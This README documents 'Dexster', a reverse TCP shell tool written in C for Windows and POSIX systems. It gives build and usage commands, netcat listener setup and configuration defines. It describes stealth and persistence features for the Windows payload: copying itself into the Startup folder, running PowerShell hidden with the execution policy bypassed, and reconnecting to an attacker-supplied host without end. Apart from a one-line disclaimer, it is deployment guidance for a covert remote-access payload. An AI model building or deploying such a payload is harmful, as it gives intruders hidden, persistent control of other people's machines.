# Dexster — Reverse TCP Shell (v2)

> **⚠️ For AUTHORIZED penetration testing and security research ONLY.**
> Running this against systems you do not own or have explicit written permission to test is illegal.

---

## What is a Reverse TCP Shell?

A **reverse shell** flips the usual client-server model. Instead of the attacker connecting *to* the target, the **target connects *out* to the attacker**. This bypasses most firewalls since outbound connections are rarely blocked.

```
  [Target Machine]  ──── TCP connect ────▶  [Attacker Machine]
                                               nc -lvnp <PORT>
                                               (now has a shell)
```

---

## Files in this folder

| File | Platform | Shell |
|---|---|---|
| `reverse_shell_x64.c` | Windows (x64) | PowerShell |
| `reverse_shell_unix.c` | Linux / macOS / POSIX | `/bin/sh` |

---

# 🪟 Windows — `reverse_shell_x64.c`

## How it works — step by step

### 1. Self-Persistence (Startup folder)
The **very first thing** the exe does on launch is copy itself into the Windows Startup folder:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```
This means the payload **automatically re-runs every time the user logs into Windows** — no manual re-execution needed.

- Uses `CopyFileA` (not `MoveFileA`) so it works while the exe is running
- Reads `%APPDATA%` at runtime — works on **any Windows user account**, not just a specific username
- If already running from the Startup folder, skips this step to avoid duplicates

### 2. Argument Parsing
Optional command-line overrides. If none are given, hardcoded defaults are used:
- **Default host:** `example.host.of.yours`
- **Default port:** `123456`

### 3. Winsock Initialization
Initializes Windows networking stack (`WSAStartup`). Required before any socket operations on Windows.

### 4. Infinite Reconnect Loop
The shell loops forever attempting to reach the attacker:

```
loop:
  ├─ Try to connect to HOST:PORT
  │     ├─ Fail? → wait 2 seconds → retry
  │     └─ Success?
  │           ├─ Spawn hidden PowerShell
  │           ├─ Pipe stdin/stdout/stderr through the socket
  │           └─ Shell exits? → wait 2 seconds → reconnect
  └─ repeat forever (MAX_RETRIES = 0 = infinite)
```

### 5. Shell Spawning
Launches PowerShell **completely hidden** (no window):
```
powershell.exe -NoProfile -ExecutionPolicy Bypass
```
All input/output is piped through the TCP socket — the attacker gets a **fully interactive PowerShell session**.

---

## Building (Windows)

**Requirements:** MinGW-w64 (GCC for Windows) — e.g. via [MSYS2](https://www.msys2.org/)

```bash
gcc reverse_shell_x64.c -o reverse_shell_x64.exe -lws2_32 -mwindows
```

| Flag | Purpose |
|---|---|
| `-lws2_32` | Links the Winsock2 library (required for socket functions) |
| `-mwindows` | Compiles as GUI subsystem binary — **no console window ever appears** |

---

## Usage (Windows)

### With default host/port (hardcoded in source):
```
.\reverse_shell_x64.exe
```

### With custom host and port:
```
.\reverse_shell_x64.exe <ATTACKER_IP> <PORT>
```

---

## Listener (Attacker Side)

Start this **before** running the payload on the target:

```bash
# Linux — netcat
nc -lvnp <your_port>

# Linux — ncat (Nmap)
ncat -lvnp <your_port>
```

Once the target connects, you will have a PowerShell prompt.

---

## Configuration (edit source before compiling)

| `#define` | Default | Description |
|---|---|---|
| `DEFAULT_HOST` | `example.host.of.yours` | Attacker IP or hostname |
| `DEFAULT_PORT` | `123456` | Port to connect back on |
| `RETRY_DELAY_MS` | `2000` | Milliseconds between reconnect attempts |
| `MAX_RETRIES` | `0` | Max connection attempts (`0` = infinite) |

---

## Behavior Summary

```
reverse_shell_x64.exe launched
        │
        ├─ [1] Copy self → Startup folder (persistence, silent)
        ├─ [2] Parse args / use defaults
        ├─ [3] Initialize Winsock
        └─ [4] Loop forever:
                  Connect to HOST:PORT
                    └─ Connected: spawn hidden PowerShell, pipe I/O to socket
                    └─ Failed / closed: sleep 2s, retry
```

---

---

# 🐧 Linux — `reverse_shell_unix.c`

## How it works

Uses POSIX BSD sockets and `fork()` to create a reverse shell using `/bin/sh`.

### Flow:
1. Resolves the target host (IP or DNS)
2. Connects to the attacker via TCP
3. `fork()`s a child process
4. Child redirects `stdin`, `stdout`, `stderr` to the socket using `dup2()`
5. Child executes `/bin/sh -i` — giving an interactive shell over the connection
6. Parent waits for the child to exit, then reconnects

No persistence mechanism — designed to be run directly on the target Linux machine.

---

## Building (Linux)

**Requirements:** GCC

```bash
# Ubuntu / Debian
sudo apt install gcc

# Compile
gcc reverse_shell_unix.c -o reverse_shell_unix
```

---

## Usage (Linux)

### With default host/port:
```bash
./reverse_shell_unix
```

### With custom host and port:
```bash
./reverse_shell_unix <ATTACKER_IP> <PORT>
```

---

## Listener (Attacker Side)

```bash
nc -lvnp <PORT>
# or
ncat -lvnp <PORT>
```

---

## Configuration

Edit these defines at the top of `reverse_shell_unix.c` before compiling:

| `#define` | Default | Description |
|---|---|---|
| `DEFAULT_HOST` | `example.host.of.yours` | Attacker IP or hostname |
| `DEFAULT_PORT` | `123456` | Port to connect back on |
| `RETRY_DELAY_SEC` | `2` | Seconds between reconnect attempts |
| `MAX_RETRIES` | `0` | Max attempts (`0` = infinite) |

---

## Compatibility

The Unix script is fully POSIX-compliant and works on:
- Ubuntu / Debian / Kali Linux
- Arch Linux
- CentOS / RHEL / Fedora
- macOS (with Xcode CLT: `xcode-select --install`)
- Any system with GCC and POSIX sockets

---

*Dexster — Reverse TCP Shell v2 - ( Built in C ) ❤️*


